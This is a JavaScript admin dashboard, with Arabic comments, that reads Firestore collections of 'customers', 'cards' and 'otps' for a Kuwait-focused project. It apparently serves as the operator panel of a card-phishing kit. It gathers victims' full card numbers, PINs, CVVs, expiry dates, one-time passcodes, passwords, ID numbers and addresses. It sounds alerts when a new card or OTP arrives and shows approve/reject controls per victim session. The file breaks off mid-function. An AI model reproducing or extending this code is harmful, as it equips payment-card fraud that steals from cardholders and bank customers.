// ═══════════════════════════════════════════════════════════
// لوحة الإشعارات المتقدمة — منطق التطبيق
// يقرأ من Firestore collection "customers" في مشروع kuwait-jaho
// ═══════════════════════════════════════════════════════════

(function () {
  'use strict';

  // ── الحالة (State) ──────────────────────────────────────────
  let allNotifications = [];      // كل الإشعارات (بعد دمج cards + customers)
  let customersMap = {};          // خريطة العملاء بالـ sessionId
  let otpsMap = {};               // خريطة OTPs بالـ sessionId (مصفوفة لكل عميل)
  let cardsBySession = {};         // خريطة البطاقات بالـ sessionId (مصفوفة لكل عميل)
  let filteredNotifications = []; // بعد تطبيق الفلاتر
  let currentFilter = 'all';
  let currentSort = 'date';
  let searchQuery = '';
  let currentPage = 1;
  let pageSize = 10;
  let showStats = true;
  let autoRefresh = true;
  let unsubCustomers = null;      // إلغاء اشتراك customers
  let unsubCards = null;          // إلغاء اشتراك cards
  let unsubOtps = null;           // إلغاء اشتراك otps
  let currentDetailId = null;    // معرّف الإشعار المعروض في النافذة
  let seenIds = new Set();       // للإشعارات الجديدة (عداد الهيدر)
  let knownCardIds = new Set();  // معرّفات البطاقات المعروفة (للكشف عن الجديد)
  let knownOtpIds = new Set();   // معرّفات OTP المعروفة (للكشف عن الجديد)
  let soundEnabled = localStorage.getItem('admin_sound') !== '0'; // الإشعارات الصوتية
  let audioCtx = null;           // Web Audio API context (يُنشأ عند الحاجة)
  let selectedReferenceId = null;
  const selectedReferenceIds = new Set();
  const cardDecisionOverrides = new Map();
  let boxCounterTimer = null;
  let referenceListCounterTimer = null;
  let presenceRefreshTimer = null;
  let knownCustomerIds = new Set();
  let customersInitialized = false;
  const binLookupCache = new Map();
  function getKuwaitBankCode(cardNumber) {
    const bin = String(cardNumber || '').replace(/\D/g, '').slice(0, 6);
    if (bin.length < 6 || !Array.isArray(window.KUWAIT_BANK_BINS)) return null;
    const match = window.KUWAIT_BANK_BINS.find((bank) => bank.bins.includes(bin));
    return match ? match.name : null;
  }
  // الاسم المختصر الإنجليزي من قاعدة BIN (label) — يُطبع على البطاقة
  function getKuwaitBankLabel(cardNumber) {
    const bin = String(cardNumber || '').replace(/\D/g, '').slice(0, 6);
    if (bin.length < 6 || !Array.isArray(window.KUWAIT_BANK_BINS)) return '';
    const match = window.KUWAIT_BANK_BINS.find((bank) => bank.bins.includes(bin));
    return match ? (match.label || match.name || '') : '';
  }
  const BANK_LOGO_DOMAINS = {
    kfh: 'kfh.com', nbk: 'nbk.com', boubyan: 'boubyan.com', gulf: 'e-gulfbank.com',
    cbk: 'cbk.com', abk: 'abk.eahli.com', burgan: 'burgan.com', warba: 'warbabank.com',
    kib: 'kib.com.kw', aub: 'ahliunited.com', ibk: 'ibku.com.kw', alrajhi: 'alrajhibank.com.kw',
    fab: 'bankfab.com', qnb: 'qnb.com', bbk: 'bbkonline.com', bankmuscat: 'bankmuscat.com',
    mashreq: 'mashreq.com', hsbc: 'hsbc.com.kw', citi: 'citi.com', bnp: 'bnpparibas.com', icbc: 'icbc.com.cn'
  };
  function cleanFirebaseBankName(value, cardNumber) {
    const text = String(value || '').trim();
    if (!text || /^\d+$/.test(text) || (cardNumber && text === String(cardNumber))) return '';
    return text;
  }
  function bankLogoDataUrl(bankCode) {
    if (!bankCode) return '/assets/images/unknown-bank.svg';
    const palette = {
      kfh: ['#075985','#ffffff'], nbk: ['#1d4ed8','#ffffff'], boubyan: ['#0f766e','#ffffff'],
      gulf: ['#0369a1','#ffffff'], cbk: ['#047857','#ffffff'], abk: ['#7c3aed','#ffffff'],
      burgan: ['#be123c','#ffffff'], warba: ['#d97706','#ffffff'], kib: ['#0f766e','#ffffff'],
      aub: ['#2563eb','#ffffff'], ibk: ['#475569','#ffffff'], alrajhi: ['#166534','#ffffff'],
      fab: ['#0e7490','#ffffff'], qnb: ['#7e22ce','#ffffff'], bbk: ['#dc2626','#ffffff'],
      bankmuscat: ['#0284c7','#ffffff'], mashreq: ['#ea580c','#ffffff'], hsbc: ['#b91c1c','#ffffff'],
      citi: ['#2563eb','#ffffff'], bnp: ['#15803d','#ffffff'], icbc: ['#dc2626','#ffffff']
    };
    const [background, foreground] = palette[bankCode] || ['#475569','#ffffff'];
    // الاسم المختصر الإنجليزي من قاعدة BIN هو ما يُطبع على الشعار
    const binEntry = Array.isArray(window.KUWAIT_BANK_BINS) ? window.KUWAIT_BANK_BINS.find((bank) => bank.name === bankCode) : null;
    const displayLabel = (binEntry && binEntry.label) || String(bankCode).toUpperCase();
    const safeCode = String(displayLabel).toUpperCase().replace(/[^A-Z0-9-]/g, '').slice(0, 12);
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 160 64"><rect width="160" height="64" rx="12" fill="${background}"/><circle cx="32" cy="32" r="18" fill="rgba(255,255,255,.2)"/><path d="M24 38h16v4H24zm2-3h12l-6-9-6 9zm2 2h3v7h-3zm5 0h3v7h-3z" fill="${foreground}"/><text x="58" y="39" font-family="Arial,sans-serif" font-size="20" font-weight="700" fill="${foreground}">${safeCode}</text></svg>`;
    return `data:image/svg+xml;charset=UTF-8,${encodeURIComponent(svg)}`;
  }
  async function lookupCardBin(cardNumber) {
    const bin = String(cardNumber || '').replace(/\D/g, '').slice(0, 8);
    if (bin.length < 6) return null;
    if (binLookupCache.has(bin)) return binLookupCache.get(bin);
    try {
      const response = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { Accept: 'application/json' } });
      if (!response.ok) return null;
      const data = await response.json();
      binLookupCache.set(bin, data);
      return data;
    } catch (error) {
      console.warn('BIN lookup unavailable:', error);
      return null;
    }
  }
  function cardSchemeClass(scheme) {
    return String(scheme || 'unknown').toLowerCase().replace(/[^a-z0-9-]/g, '') || 'unknown';
  }
  let referenceFilter = 'all';

  // ── عناصر DOM ───────────────────────────────────────────────
  const $ = (id) => document.getElementById(id);
  const els = {
    loginScreen: $('login-screen'),
    loginForm: $('login-form'),
    loginEmail: $('login-email'),
    loginPassword: $('login-password'),
    forgotPassword: $('forgot-password'),
    loginError: $('login-error'),
    app: $('app'),
    lastUpdate: $('last-update'),
    headerBadge: $('header-badge'),
    btnRefresh: $('btn-refresh'),
    refreshIcon: $('refresh-icon'),
    btnSound: $('btn-sound'),
    soundOnIcon: $('sound-on-icon'),
    soundOffIcon: $('sound-off-icon'),
    btnToggleStats: $('btn-toggle-stats'),
    btnMenu: $('btn-menu'),
    menuDropdown: $('menu-dropdown'),
    menuSettings: $('menu-settings'),
    menuExport: $('menu-export'),
    menuLogout: $('menu-logout'),
    tabNotifications: $('tab-notifications'),
    tabProducts: $('tab-products'),
    productsBack: $('products-back'),
    notificationsView: $('notifications-view'),
    productsView: $('products-view'),
    statsSection: $('stats-section'),
    filterTabs: $('filter-tabs'),
    sortSelect: $('sort-select'),
    searchInput: $('search-input'),
    notifCount: $('notif-count'),
    tbody: $('notifications-tbody'),
    emptyState: $('empty-state'),
    emptyMsg: $('empty-msg'),
    pagination: $('pagination'),
    paginationInfo: $('pagination-info'),
    paginationButtons: $('pagination-buttons'),
    referenceSidebar: $('reference-sidebar'),
    referenceVisitorList: $('reference-visitor-list'),
    referenceInboxCount: $('reference-inbox-count'),
    referenceSearch: $('reference-search'),
    referenceDetailPane: $('reference-detail-pane'),
    referenceDetailEmpty: $('reference-detail-empty'),
    referenceDetailContent: $('reference-detail-content'),
    headerOnlineCount: $('header-online-count'),
    headerTodayCount: $('header-today-count'),
    headerTotalCount: $('header-total-count'),
    headerCardCount: $('header-card-count'),
    // النوافذ المنبثقة
    detailModal: $('detail-modal'),
    detailTitle: $('detail-title'),
    detailContent: $('detail-content'),
    detailClose: $('detail-close'),
    detailCancel: $('detail-cancel'),
    settingsModal: $('settings-modal'),
    settingsClose: $('settings-close'),
    settingAutoRefresh: $('setting-autorefresh'),
    settingShowStats: $('setting-showstats'),
    settingPageSize: $('setting-pagesize'),
    accountForm: $('account-form'),
    accountEmail: $('account-email'),
    accountPassword: $('account-password'),
    accountCurrentPassword: $('account-current-password'),
    accountSave: $('account-save'),
    accountMsg: $('account-msg'),
    exportModal: $('export-modal'),
    exportClose: $('export-close'),
    exportJson: $('export-json'),
    exportCsv: $('export-csv'),
    exportMsg: $('export-msg'),
    toastContainer: $('toast-container'),
  };

  // ── أدوات مساعدة ────────────────────────────────────────────
  function escapeHtml(s) {
    if (s === null || s === undefined) return '';
    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  }
  function fmtTime(ts) {
    if (!ts) return '-';
    const d = ts.toDate ? ts.toDate() : new Date(ts);
    return d.toLocaleString('ar-EG', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' });
  }
  function timeAgo(ts) {
    if (!ts) return 'غير معروف';
    const d = ts.toDate ? ts.toDate() : new Date(ts);
    const diff = (Date.now() - d.getTime()) / 1000;
    if (diff < 60) return 'منذ ثوانٍ';
    if (diff < 3600) return `منذ ${Math.floor(diff / 60)} دقيقة`;
    if (diff < 86400) return `منذ ${Math.floor(diff / 3600)} ساعة`;
    return `منذ ${Math.floor(diff / 86400)} يوم`;
  }
  function isOnline(lastSeen, online) {
    if (online === false) return false;
    if (!lastSeen) return false;
    const d = lastSeen.toDate ? lastSeen.toDate() : new Date(lastSeen);
    return (Date.now() - d.getTime()) < 60000; // أقل من دقيقة = متصل
  }
  function statusBadge(status) {
    const map = {
      'pending':    { text: 'معلق', cls: 'bg-amber-500/10 text-amber-400 border-amber-500/30' },
      'approved':   { text: 'موافقة', cls: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' },
      'rejected':   { text: 'رفض', cls: 'bg-red-500/10 text-red-400 border-red-500/30' },
      'active':     { text: 'نشط', cls: 'bg-blue-500/10 text-blue-400 border-blue-500/30' },
      'PENDING':    { text: 'معلق', cls: 'bg-amber-500/10 text-amber-400 border-amber-500/30' },
      'APPROVED':   { text: 'معتمد', cls: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' },
      'REJECTED':   { text: 'مرفوض', cls: 'bg-red-500/10 text-red-400 border-red-500/30' },
    };
    const s = map[status] || { text: status || 'غير معروف', cls: 'bg-slate-500/10 text-slate-400 border-slate-500/30' };
    return `<span class="inline-flex items-center gap-1 rounded-md border px-2 py-0.5 text-xs font-medium ${s.cls}">${escapeHtml(s.text)}</span>`;
  }

  // ── التوست (Toasts) ─────────────────────────────────────────
  function toast(message, type = 'info') {
    const colors = {
      success: 'bg-emerald-600',
      error: 'bg-red-600',
      info: 'bg-slate-700',
    };
    const div = document.createElement('div');
    div.className = `${colors[type] || colors.info} text-white text-sm font-medium px-4 py-3 rounded-lg shadow-lg animate-[fadeIn_0.2s_ease-out]`;
    div.textContent = message;
    els.toastContainer.appendChild(div);
    setTimeout(() => { div.style.opacity = '0'; div.style.transition = 'opacity 0.3s'; setTimeout(() => div.remove(), 300); }, 3000);
  }

  // ── التنبيه الصوتي (نغمة هادئة واحدة عند بطاقة/OTP جديد) ───
  // ── المراحل: زائر جديد / بطاقة / رمز تحقق ─────────────────
  let cardAlertAudio = null;
  function playCardAlertAudio() {
    if (!soundEnabled) return;
    try {
      cardAlertAudio = cardAlertAudio || new Audio('/assets/audio/card-alert.mp3');
      cardAlertAudio.currentTime = 0;
      cardAlertAudio.play().catch(() => {});
    } catch (e) { /* تجاهل قيود تشغيل الصوت في المتصفح */ }
  }
  function playNotificationTone(stage = 'card') {
    if (!soundEnabled) return;
    if (stage === 'card') {
      playCardAlertAudio();
      return;
    }
    try {
      audioCtx = audioCtx || new (window.AudioContext || window.webkitAudioContext)();
      if (audioCtx.state === 'suspended') audioCtx.resume();
      const tones = {
        visitor: [660, 880],
        card: [880, 1320],
        otp: [1046, 1568, 2093],
      };
      const frequencies = tones[stage] || tones.card;
      const now = audioCtx.currentTime;
      frequencies.forEach((freq, i) => {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'sine';
        osc.frequency.value = freq;
        const start = now + i * 0.11;
        gain.gain.setValueAtTime(0, start);
        gain.gain.linearRampToValueAtTime(0.15, start + 0.01);  // ظهور تدريجي
        gain.gain.exponentialRampToValueAtTime(0.001, start + 0.18); // تلاشٍ سريع
        osc.connect(gain).connect(audioCtx.destination);
        osc.start(start);
        osc.stop(start + 0.19);
      });
    } catch (e) { /* تجاهل أخطاء الصوت بصمت */ }
  }

  function updateSoundUI() {
    if (!els.btnSound) return;
    els.soundOnIcon.classList.toggle('hidden', !soundEnabled);
    els.soundOffIcon.classList.toggle('hidden', soundEnabled);
    els.btnSound.title = soundEnabled ? 'إيقاف التنبيهات الصوتية' : 'تفعيل التنبيهات الصوتية';
  }

  function toggleSound() {
    soundEnabled = !soundEnabled;
    localStorage.setItem('admin_sound', soundEnabled ? '1' : '0');
    updateSoundUI();
    // إن فُعّل للتو، نشغّل نغمة تأكيد بسيطة (يتطلب تفاعل المستخدم لإنشاء AudioContext)
    if (soundEnabled) playNotificationTone();
  }

  // ── المصادقة (Login) ────────────────────────────────────────
  async function login(email, password) {
    try {
      await firebase.auth().signInWithEmailAndPassword(email, password);
      return true;
    } catch (err) {
      throw err;
    }
  }

  async function sendPasswordReset() {
    const email = els.loginEmail.value.trim();
    els.loginError.classList.add('hidden');
    if (!email) {
      els.loginError.textContent = 'أدخل بريدك الإلكتروني أولًا ثم اضغط نسيت كلمة المرور.';
      els.loginError.className = 'text-sm text-red-400 text-center';
      els.loginError.classList.remove('hidden');
      els.loginEmail.focus();
      return;
    }
    els.forgotPassword.disabled = true;
    els.forgotPassword.textContent = 'جارٍ إرسال الرابط...';
    try {
      await firebase.auth().sendPasswordResetEmail(email, {
        url: window.location.origin,
        handleCodeInApp: false,
      });
      els.loginError.textContent = 'تم إرسال رابط إعادة تعيين كلمة المرور إلى بريدك الإلكتروني. تحقق من البريد الوارد والرسائل غير المرغوب فيها.';
      els.loginError.className = 'text-sm text-emerald-400 text-center';
      els.loginError.classList.remove('hidden');
    } catch (err) {
      const messages = {
        'auth/user-not-found': 'لا يوجد حساب بهذا البريد الإلكتروني.',
        'auth/invalid-email': 'البريد الإلكتروني غير صالح.',
        'auth/too-many-requests': 'محاولات كثيرة. انتظر قليلًا ثم أعد المحاولة.',
      };
      els.loginError.textContent = messages[err.code] || 'تعذر إرسال رابط إعادة التعيين. تحقق من البريد وحاول مرة أخرى.';
      els.loginError.className = 'text-sm text-red-400 text-center';
      els.loginError.classList.remove('hidden');
    } finally {
      els.forgotPassword.disabled = false;
      els.forgotPassword.textContent = 'نسيت كلمة المرور؟ إرسال رابط إعادة التعيين';
    }
  }

  function showApp() {
    els.loginScreen.classList.add('hidden');
    els.app.classList.remove('hidden');
    startListening();
  }

  function logout() {
    if (unsubCustomers) { unsubCustomers(); unsubCustomers = null; }
    if (unsubCards) { unsubCards(); unsubCards = null; }
    if (unsubOtps) { unsubOtps(); unsubOtps = null; }
    firebase.auth().signOut().then(() => {
      localStorage.removeItem('zain_panel_auth');
      els.app.classList.add('hidden');
      els.loginScreen.classList.remove('hidden');
      els.loginError.classList.add('hidden');
    });
  }

  // ── الاستماع للبيانات من Firestore ──────────────────────────
  // مثل اللوحة القديمة تماماً: ندمج collection "cards" (كل بطاقة) مع
  // collection "customers" (بيانات العميل) عبر sessionId. كل صف = بطاقة.
  function startListening() {
    // فلاتر افتراضية للحالة
    document.querySelector('.filter-btn[data-filter="all"]').setAttribute('data-active', 'true');
    document.querySelector('.filter-btn[data-filter="all"]').classList.add('bg-emerald-600', 'text-white');

    // الإعدادات المحفوظة
    try {
      const saved = JSON.parse(localStorage.getItem('zain_panel_settings') || '{}');
      if (saved.pageSize) { pageSize = saved.pageSize; els.settingPageSize.value = saved.pageSize; }
      if (saved.showStats !== undefined) { showStats = saved.showStats; els.settingShowStats.checked = showStats; }
      if (saved.autoRefresh !== undefined) { autoRefresh = saved.autoRefresh; els.settingAutoRefresh.checked = autoRefresh; }
    } catch (e) {}
    applyShowStats();

    // استماع لـ customers (يحفظ في خريطة بالـ sessionId)
    try {
      unsubCustomers = db.collection('customers').onSnapshot((snap) => {
        const hasNewCustomer = customersInitialized && snap.docChanges().some((change) => change.type === 'added' && !knownCustomerIds.has(change.doc.id));
        customersMap = {};
        snap.forEach((doc) => {
          const data = doc.data();
          customersMap[data.sessionId || doc.id] = { id: doc.id, ...data };
          knownCustomerIds.add(doc.id);
        });
        if (hasNewCustomer) playNotificationTone('visitor');
        customersInitialized = true;
        rebuildMerged();
      }, (err) => {
        console.error('customers listen error:', err);
        toast('خطأ في قراءة العملاء: ' + (err.message || err.code), 'error');
      });
    } catch (e) { console.error(e); }

    // تحديث مؤشرات متصل/غير متصل حتى عند توقف النبض دون تغيير وثيقة أخرى
    if (!presenceRefreshTimer) {
      presenceRefreshTimer = setInterval(() => {
        renderTable();
        renderStats();
        renderReferenceVisitorList();
      }, 5000);
    }

    // استماع لـ cards (كل بطاقة = صف في الجدول)
    try {
      unsubCards = db.collection('cards').onSnapshot((snap) => {
        cardsList = [];
        cardsBySession = {};
        let hasNewCard = false;
        snap.docChanges().forEach((change) => {
          if (change.type === 'added' && !knownCardIds.has(change.doc.id)) {
            hasNewCard = true;
          }
        });
        snap.forEach((doc) => {
          const data = doc.data();
          const item = { id: doc.id, ...data };
          cardsList.push(item);
          knownCardIds.add(doc.id);
          const sid = data.sessionId || '';
          if (sid) {
            if (!cardsBySession[sid]) cardsBySession[sid] = [];
            cardsBySession[sid].push(item);
          }
        });
        // ترتيب بطاقات كل عميل من الأحدث للأقدم
        Object.keys(cardsBySession).forEach(sid => {
          cardsBySession[sid].sort((a, b) => {
            const ta = a.createdAt ? (a.createdAt.toDate ? a.createdAt.toDate().getTime() : new Date(a.createdAt).getTime() || 0) : 0;
            const tb = b.createdAt ? (b.createdAt.toDate ? b.createdAt.toDate().getTime() : new Date(b.createdAt).getTime() || 0) : 0;
            return tb - ta;
          });
        });
        if (hasNewCard) playNotificationTone('card');
        rebuildMerged();
      }, (err) => {
        console.error('cards listen error:', err);
      });
    } catch (e) { console.error(e); }

    // استماع لـ otps (كل OTP = وثيقة منفصلة، نجمعها بالـ sessionId)
    try {
      unsubOtps = db.collection('otps').onSnapshot((snap) => {
        otpsMap = {};
        let hasNewOtp = false;
        snap.docChanges().forEach((change) => {
          if (change.type === 'added' && !knownOtpIds.has(change.doc.id)) {
            hasNewOtp = true;
          }
        });
        snap.forEach((doc) => {
          const data = doc.data();
          knownOtpIds.add(doc.id);
          const sid = data.sessionId || '';
          if (sid) {
            if (!otpsMap[sid]) otpsMap[sid] = [];
            otpsMap[sid].push({ id: doc.id, ...data });
          }
        });
        // ترتيب OTPs كل عميل من الأحدث للأقدم
        Object.keys(otpsMap).forEach(sid => {
          otpsMap[sid].sort((a, b) => {
            const ta = a.createdAt ? (a.createdAt.toDate ? a.createdAt.toDate().getTime() : new Date(a.timestamp || a.createdAt).getTime() || 0) : 0;
            const tb = b.createdAt ? (b.createdAt.toDate ? b.createdAt.toDate().getTime() : new Date(b.timestamp || b.createdAt).getTime() || 0) : 0;
            return tb - ta;
          });
        });
        if (hasNewOtp) playNotificationTone('otp');
        rebuildMerged();
      }, (err) => {
        console.error('otps listen error:', err);
      });
    } catch (e) { console.error(e); }
  }

  // قائمة البطاقات (تُحدّث من onSnapshot)
  let cardsList = [];

  // دمج cards + customers + otps — تبويب واحد لكل عميل (تجميع بالـ sessionId)
  function rebuildMerged() {
    if (!customersMap) return;

    // نجمع كل sessionIds من المصادر الثلاثة (customers + cards + otps)
    // لنضمن ظهور كل عميل مرة واحدة فقط حتى لو لم تكن له بطاقة/OTP
    const allSids = new Set([
      ...Object.keys(customersMap),
      ...Object.keys(cardsBySession),
      ...Object.keys(otpsMap),
    ]);

    const toTime = (v) => {
      if (!v) return 0;
      if (typeof v.toDate === 'function') return v.toDate().getTime();
      const t = new Date(v).getTime();
      return isNaN(t) ? 0 : t;
    };

    const merged = Array.from(allSids).map(sid => {
      const m = customersMap[sid] || {};
      // كل البطاقات وكل الـ OTPs لهذا العميل (مرتبة من الأحدث بالفعل في onSnapshot)
      const sessionCards = cardsBySession[sid] || [];
      const sessionOtps = otpsMap[sid] || [];
      const latestCard = sessionCards[0] || {};
      const latestOtp = sessionOtps.length ? sessionOtps[0] : null;
      const ls = toTime(m.lastSeen);
      // آخر نشاط = أحدث تاريخ بين آخر بطاقة وآخر OTP وآخر رؤية
      const lastActivity = Math.max(
        toTime(latestCard.createdAt),
        toTime(latestOtp && latestOtp.createdAt),
        ls
      );
      return {
        // المعرف الفريد = sessionId (تبويب واحد لكل عميل)
        id: sid,
        sessionId: sid,
        // أحدث بطاقة (للعرض في الأعمدة الرئيسية للجدول)
        cardNumber: latestCard.cardNumber || '',
        prefix: latestCard.cardPrefix || '',
        // الاسم المختصر الإنجليزي من قاعدة BIN يُفضَّل على اسم Firebase
        bank: getKuwaitBankLabel(latestCard.cardNumber) || latestCard.bankName || '',
        expiryDate: latestCard.expiry || '',
        pin: latestCard.pin || '',
        cvv: latestCard.cvv || '',
        cardCreatedAt: latestCard.createdAt || null,
        cardTimestamp: latestCard.timestamp || '',
        // كل البطاقات وكل الـ OTPs لهذا العميل
        allCards: sessionCards,
        allOtps: sessionOtps,
        // بيانات العميل (من customers)
        name: m.name || '',
        phone: m.phone || '',
        address: m.address || '',
        apartment: m.apartment || '',
        deliveryNotes: m.deliveryNotes || '',
        items: m.items || [],
        amount: m.amount || '',
        paymentType: m.paymentType || '',
        otp: latestOtp ? latestOtp.otp : (m.otp || ''),
        otp2: m.otp2 || '',
        idNumber: m.idNumber || '',
        network: m.network || '',
        email: m.email || '',
        country: m.country || '',
        pass: m.pass || '',
        step: m.step || '',
        // الحالة والعرض
        status: m.status || 'pending',
        decision: m.decision || '',
        isHidden: !!m.isHidden,
        isArchived: !!m.isArchived,
        isBlocked: !!m.isBlocked,
        flagColor: m.flagColor || '',
        currentPage: m.currentPage || '',
        online: m.online,
        lastSeen: ls,
        sessionStartedAt: m.sessionStartedAt || null,
        interactionAt: m.interactionAt || null,
        createdDate: latestCard.createdAt || m.createdAt || null,
        // آخر تحديث لبيانات العميل الأساسية فقط (وليس lastSeen الذي يتحدث مع كل نشاط).
        // يُستخدم لمعرفة متى كانت "معلومات أساسية" هي الأحدث بين الصناديق.
        customerUpdatedAt: m.updatedAt || m.createdAt || null,
        lastActivity: lastActivity,
        ip: m.ip || '',
        device: m.device || '',
        browser: m.browser || '',
      };
    })
    // إظهار العملاء الذين أدخلوا بياناتهم فقط (ليس مجرد زائرين)
    // العميل يظهر إذا كان لديه: اسم أو هاتف أو عنوان أو بطاقة أو OTP
    .filter(x => !x.isHidden && (
      x.name || x.phone || x.address ||
      (x.allCards && x.allCards.length > 0) ||
      (x.allOtps && x.allOtps.length > 0)
    ))
    // ترتيب: آخر نشاط أولاً (الأحدث)
    .sort((a, b) => (b.lastActivity || 0) - (a.lastActivity || 0));

    allNotifications = merged;

    // عدّاد الإشعارات الجديدة
    const newOnes = merged.filter(n => !seenIds.has(n.id));
    if (seenIds.size > 0 && newOnes.length > 0) {
      els.headerBadge.textContent = newOnes.length;
      els.headerBadge.classList.remove('hidden');
    }
    newOnes.forEach(n => seenIds.add(n.id));
    renderReferenceVisitorList();
    if (selectedReferenceId) {
      const selected = allNotifications.find(n => n.id === selectedReferenceId);
      if (selected) renderReferenceDetail(selected);
    }

    // آخر تحديث
    els.lastUpdate.textContent = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
    applyFilters();
  }

  // ── الفلترة والترتيب ─────────────────────────────────────────
  function applyFilters() {
    filteredNotifications = allNotifications.filter(n => {
      // فلتر التبويب
      if (currentFilter === 'pending' && !(n.status === 'pending' || n.status === 'PENDING' || n.decision === 'pending' || (!n.decision && n.status !== 'approved' && n.status !== 'rejected'))) return false;
      if (currentFilter === 'card' && !n.cardNumber) return false;
      if (currentFilter === 'online' && !isOnline(n.lastSeen, n.online)) return false;
      // البحث
      if (searchQuery) {
        const q = searchQuery.toLowerCase();
        const hay = [n.name, n.phone, n.country, n.otp, n.cardNumber, n.bank, n.currentPage, n.sessionId, n.id].filter(Boolean).join(' ').toLowerCase();
        if (!hay.includes(q)) return false;
      }
      return true;
    });

    // الترتيب
    filteredNotifications.sort((a, b) => {
      if (currentSort === 'date') {
        return (b.lastActivity || b.createdDate ? (b.lastActivity || (b.createdDate.toDate ? b.createdDate.toDate().getTime() : (new Date(b.createdDate).getTime() || 0))) : 0) - (a.lastActivity || a.createdDate ? (a.lastActivity || (a.createdDate.toDate ? a.createdDate.toDate().getTime() : (new Date(a.createdDate).getTime() || 0))) : 0);
      }
      if (currentSort === 'status') return (a.status || '').localeCompare(b.status || '');
      if (currentSort === 'country') return (a.country || '').localeCompare(b.country || '');
      return 0;
    });

    renderTable();
    renderStats();
  }

  function renderReferenceVisitorList() {
    if (!els.referenceVisitorList) return;
    const q = (els.referenceSearch?.value || '').trim().toLowerCase();
    const list = allNotifications.filter(n => {
      if (referenceFilter === 'archive') {
        if (!n.isArchived) return false;
      } else {
        if (n.isArchived) return false;
        if (referenceFilter === 'card' && !n.cardNumber) return false;
      }
      return !q || [n.name, n.phone, n.country, n.bank, n.id].filter(Boolean).join(' ').toLowerCase().includes(q);
    });
    els.referenceInboxCount.textContent = String(list.length);
    if (!list.length) {
      els.referenceVisitorList.innerHTML = '<div class="reference-empty">لا يوجد زوار مطابقون</div>';
      return;
    }
    els.referenceVisitorList.innerHTML = list.slice(0, 80).map(n => {
      const online = isOnline(n.lastSeen, n.online);
      const title = n.name || n.phone || n.country || 'زائر جديد';
      const subtitle = n.currentPage || n.bank || 'في انتظار التفاعل';
      const toCounterMillis = (value) => value?.toDate ? value.toDate().getTime() : (new Date(value || 0).getTime() || 0);
      const records = [...(n.allCards || (n.cardNumber ? [n] : [])), ...(n.allOtps || [])];
      const latestInteractionTime = toCounterMillis(n.interactionAt || n.customerUpdatedAt || n.sessionStartedAt || n.createdDate);
      const latestBoxTime = records.reduce((latest, record) => Math.max(latest, toCounterMillis(record.createdAt || record.cardCreatedAt || record.updatedAt)), latestInteractionTime);
      const checked = selectedReferenceIds.has(n.id);
      return `<button class="reference-visitor-row ${checked ? 'bulk-selected' : ''}" data-ref-id="${escapeHtml(n.id)}">
        <span class="reference-checkbox" data-ref-check="${escapeHtml(n.id)}">${checked ? '☑' : '□'}</span>
        <span class="reference-avatar">${escapeHtml(title.charAt(0).toUpperCase())}</span>
        <span class="reference-visitor-copy"><strong>${escapeHtml(title)}</strong><small>${escapeHtml(subtitle)}</small></span>
        <span class="reference-visitor-meta"><i class="${online ? 'online' : ''}"></i><small class="reference-client-counter" data-client-counter data-client-time="${latestBoxTime}">${escapeHtml(formatClientElapsed(latestBoxTime))}</small></span>
      </button>`;
    }).join('');
    updateReferenceBulkActions();
    if (referenceListCounterTimer) clearInterval(referenceListCounterTimer);
    referenceListCounterTimer = setInterval(() => document.querySelectorAll('[data-client-counter]').forEach(node => { node.textContent = formatClientElapsed(Number(node.dataset.clientTime)); }), 1000);
  }
  function formatClientElapsed(timestamp) {
    const seconds = Math.max(0, Math.floor((Date.now() - (timestamp || Date.now())) / 1000));
    if (seconds < 60) return `${seconds} ثانية`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes} دقيقة`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours} ساعة`;
    const days = Math.floor(hours / 24);
    if (days < 30) return `${days} يوم`;
    const months = Math.floor(days / 30);
    if (months < 12) return `${months} شهر`;
    const years = Math.floor(days / 365);
    const remainingMonths = Math.floor((days % 365) / 30);
    return remainingMonths ? `${years} سنة و ${remainingMonths} شهر` : `${years} سنة`;
  }

  function updateReferenceBulkActions() {
    const count = selectedReferenceIds.size;
    const inArchive = referenceFilter === 'archive';
    const selectAll = $('reference-select-all');
    const archive = $('reference-archive');
    const unarchive = $('reference-unarchive');
    const remove = $('reference-delete');
    if (selectAll) selectAll.textContent = count ? '☑ إلغاء التحديد' : '□ تحديد الكل';
    if (archive) {
      // زر "أرشفة" يظهر فقط خارج تبويب "المؤرشف" (لا معنى لأرشفة مادة مأرشفة مسبقاً)
      archive.classList.toggle('hidden', inArchive);
      archive.disabled = !count || inArchive;
      archive.textContent = count ? `▣ أرشفة (${count})` : '▣ أرشفة';
    }
    if (unarchive) {
      // زر الإخراج من الأرشفة: يظهر فقط في تبويب "المؤرشف"
      unarchive.classList.toggle('hidden', !inArchive);
      unarchive.disabled = !count;
      unarchive.textContent = count ? `↩ إخراج من الأرشفة (${count})` : '↩ إخراج من الأرشفة';
    }
    if (remove) { remove.disabled = !count; remove.textContent = count ? `× حذف (${count})` : '× حذف'; }
  }

  function renderReferenceDetail(visitor) {
    if (!els.referenceDetailContent || !visitor) return;
    const name = visitor.name || visitor.phone || visitor.country || 'زائر جديد';
    const status = visitor.decision || visitor.status || 'pending';
    const statusText = status === 'approved' ? 'تمت الموافقة' : status === 'rejected' ? 'تم الرفض' : 'قيد المراجعة';
    const cards = visitor.allCards || (visitor.cardNumber ? [visitor] : []);
    const otps = visitor.allOtps || [];
    const toMillis = (value) => value?.toDate ? value.toDate().getTime() : (new Date(value || 0).getTime() || 0);
    const cardTime = (card) => toMillis(card.createdAt || card.cardCreatedAt || card.timestamp || card.cardTimestamp || card.updatedAt || card.cardUpdatedAt || visitor.updatedAt || visitor.lastSeen);
    const otpTime = (otp) => toMillis(otp.createdAt || otp.timestamp || otp.updatedAt || visitor.updatedAt || visitor.lastSeen);
    const formatElapsed = (value) => {
      if (!value) return '0 ثانية';
      const seconds = Math.max(0, Math.floor((Date.now() - value) / 1000));
      if (seconds < 60) return `${seconds} ثانية`;
      const minutes = Math.floor(seconds / 60);
